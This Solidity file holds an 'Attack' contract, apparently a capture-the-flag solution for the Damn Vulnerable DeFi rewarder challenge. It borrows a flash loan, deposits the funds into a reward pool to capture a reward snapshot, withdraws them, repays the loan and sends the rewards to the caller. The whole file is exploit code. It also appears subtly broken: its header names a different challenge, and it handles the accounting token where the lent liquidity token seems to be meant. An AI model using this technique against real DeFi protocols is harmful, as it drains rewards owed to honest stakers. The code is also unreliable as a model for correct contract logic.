// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {Address} from "openzeppelin-contracts/utils/Address.sol";
import {FlashLoanerPool} from "./FlashLoanerPool.sol";
import {TheRewarderPool} from "./TheRewarderPool.sol";
import {AccountingToken} from "./AccountingToken.sol";
import {RewardToken} from "./RewardToken.sol";

import "forge-std/console.sol";
/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */

contract Attack {
    FlashLoanerPool flashLoanPool;
    TheRewarderPool rewarderPool;
    AccountingToken accToken;
    RewardToken rewardToken;

    constructor(
        address rewardTokenAddress,
        address accTokenAddress,
        address flashLoanPoolAddress,
        address rewarderPoolAddress
    ) {
        rewardToken = RewardToken(rewardTokenAddress);
        accToken = AccountingToken(accTokenAddress);
        flashLoanPool = FlashLoanerPool(flashLoanPoolAddress);
        rewarderPool = TheRewarderPool(rewarderPoolAddress);
    }

    function execute() external payable {
        uint256 poolBalance = accToken.balanceOf(address(flashLoanPool));
        //make a flashloan
        flashLoanPool.flashLoan(poolBalance);

        console.log("reward balance of this", rewardToken.balanceOf(address(this)));
        rewardToken.transfer(address(msg.sender), rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external payable {
        accToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        accToken.transfer(address(flashLoanPool), amount);
    }

    receive() external payable {}
}
